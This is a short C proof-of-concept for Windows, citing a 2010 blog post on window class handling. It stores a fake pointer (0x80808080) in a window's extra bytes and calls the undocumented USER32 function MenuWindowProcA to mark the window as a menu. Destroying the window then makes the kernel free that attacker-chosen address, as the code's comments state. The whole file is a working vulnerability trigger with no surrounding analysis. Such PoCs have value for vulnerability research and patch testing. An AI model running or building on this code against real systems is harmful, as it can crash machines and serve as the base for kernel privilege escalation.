#include <windows.h>

/*
Source:
http://mista.nu/blog/2010/12/01/windows-class-handling-gone-wrong/
*/

int main(int argc, char **argv)
{
	WNDCLASSA Class = {0};
	CREATESTRUCTA Cs = {0};
	FARPROC MenuWindowProcA;
	HMODULE hModule;
	HWND hWindow;

	Class.lpfnWndProc = DefWindowProc;
	Class.lpszClassName = "Class";
	Class.cbWndExtra = sizeof(PVOID);

	RegisterClassA(&Class);

	hModule = LoadLibraryA("USER32.DLL");

	MenuWindowProcA = GetProcAddress(hModule,"MenuWindowProcA");

	hWindow = CreateWindowA("Class","Window",0,0,0,32,32,NULL,NULL,NULL,NULL);

	// set the pointer value of the (soon to be) popup menu structure
	SetWindowLongPtr(hWindow,0,(LONG_PTR)0x80808080);

	// set WND->fnid = FNID_MENU
	MenuWindowProcA(hWindow,0,WM_NCCREATE,(WPARAM)0,(LPARAM)&Cs);

	// trigger -> ExPoolFree(0x80808080)
	DestroyWindow(hWindow);

	return 0;
}